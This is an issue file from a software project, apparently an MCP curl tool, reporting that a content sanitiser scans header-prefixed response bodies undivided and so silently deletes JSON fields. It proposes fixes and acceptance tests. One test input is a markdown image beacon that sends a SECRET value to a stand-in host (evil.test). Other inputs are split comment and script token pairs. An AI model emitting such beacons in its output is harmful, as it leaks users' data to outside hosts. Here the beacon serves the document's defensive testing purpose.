---
id: 012
title: "A headers-prefixed body is defended undivided, so the strip pairs tokens across its fields and deletes them"
status: open
severity: P1
tags: [security, data-loss, class-fix, pre-existing]
class-id: broken-contract
aliases: [unwrapped-multi-write, unescaped-sink]
source: /sixees-workflow:review round on the todo-006 branch (data-integrity-guardian, performance-oracle)
reviewers: [data-integrity-guardian, performance-oracle]
created: 2026-09-04
---

# A headers-prefixed body is defended undivided

## Problem

`defendForInline` takes the per-leaf arm only when its whole input parses as a
JSON document. With `include_headers: true` and `include_metadata: false`,
`formatter.ts::formatResponse` returns

```
[mcp-curl notices]\n\n<responseHeaders>\n\n<body>
```

which starts with `HTTP/1.1` and therefore does not parse. So `defendForInline`
takes the **undivided** arm — `defendInlineString` over the whole composed
string — and the body inside it loses the per-leaf treatment it would have had
on its own. A token pair split across two of the body's fields then deletes
everything between them.

This is the same class as the nested-leaf defect fixed in `e6ad205`, reached by
a different route: there the body was a string *leaf* of the metadata envelope;
here it is a *suffix* of a composed plain-text string. Fixing the leaf arm does
not reach this one.

## Evidence

Measured on this tree **after** `e6ad205`, real modules, `executeCommand`
mocked, `include_headers: true`, `include_metadata: false`, body served as
`application/json`:

```
INPUT  body : {"a":"open <!--","b":"secret","c":"close -->","d":"kept"}
OUTPUT      : HTTP/1.1 200 OK
              content-type: application/json

              {"a":"open ","d":"kept"}
```

**`b` and `c` are gone, the remaining text is still valid JSON, and the file on
disk keeps all four fields.** Nothing downstream can detect the loss: a spliced
document parses exactly as well as a complete one. `LESSONS.md` RC-16's closing
lesson is the assertion this needs — *where a defence can delete, the test is
not "does the result parse" but "are all the parts still there"*.

The header region itself is not the leak: `response/header-channel.ts::extractHeaderChannel`
already strips comment and tag tokens from header text before assembly, and that
was confirmed by measurement (`x-trace: a<!--b` → `x-trace: ab`, a `-->` in the
body left intact). The defect is entirely that the **body** is scanned undivided
because something was prefixed to it.

## Sweep

`rg -n --glob '!*.test.ts' -e 'defendInlineString\(' -e 'defendForInline\(' src/lib`
— 17 candidates → the two arms in `processor.ts` confirmed, of which the nested-leaf
one is now fixed. `tools/jq-query.ts::executeJqQuery` is a **suspected** third
instance (jq output is a document whose leaves can themselves be documents) and
was not executed.

## Why this is filed rather than fixed

Out of scope for the branch that found it. The authorised fix there was the depth
bound and the nested-leaf arm; this arm needs a different mechanism and the two
candidate mechanisms both have costs that want deciding on their own:

1. **Two content parts** — headers as one, body as another, so `processTextPart`
   defends each independently. This is invariant 13's shape ("the split point
   comes from a source the remote cannot write to") applied at the wrap, and it
   is the structurally honest form. But `CurlExecuteResult.content` is declared
   as a **1-tuple** and is exported from `mcp-curl/lib`, so widening it is an
   invariant 11 public-contract change and a MAJOR bump.
2. **Defend the body before composing** in `formatResponse`. Smaller, but it
   puts a second caller on the inline defence (K-12) and interacts with
   invariant 14's size gate: `exceedsInlineCap` measures `defendForInline(body)`,
   so defending earlier shifts the accounting, and `docs/todos/008` already
   records that a growth-band body is defended twice per response.

## Fix

Take option 1 if a MAJOR bump is acceptable; otherwise option 2 with the size
gate re-derived in the same change. **Either way the fix belongs in
`processor.ts` or at the wrap, not in `formatResponse` alone** — the decision
about how a composed string is divided is the defence's to make, and a fix
applied only to the one composition this repo happens to build today is the
shape RC-16 already warned against ("the fix could not be special-case our own
envelope").

## Acceptance criteria

- [ ] With `include_headers: true` and `include_metadata: false`, a body of
      `{"a":"open <!--","b":"secret","c":"close -->","d":"kept"}` returns with
      **all four keys present**. Fails today.
- [ ] The same for a `<script>`/`</script>` pair and a `<style>`/`</style>` pair
      split across two fields.
- [ ] The beacon strip still fires on that arm — a body containing
      `![x](https://evil.test/?d=SECRET)` still returns `[image removed]`, so the
      fix widens the defence rather than exempting the channel.
- [ ] A positive control: header text carrying an unpaired `<!--` does not
      consume the body's first line.
- [ ] Whichever option is taken, `exceedsInlineCap` still measures the bytes the
      model receives (invariant 14), and the count is re-derived rather than
      assumed unchanged.
- [ ] The `jq_query` instance is either confirmed and fixed with the same
      mechanism, or shown not to apply — it is `suspected`, not `confirmed`, and
      closing this todo without settling it leaves the class open.
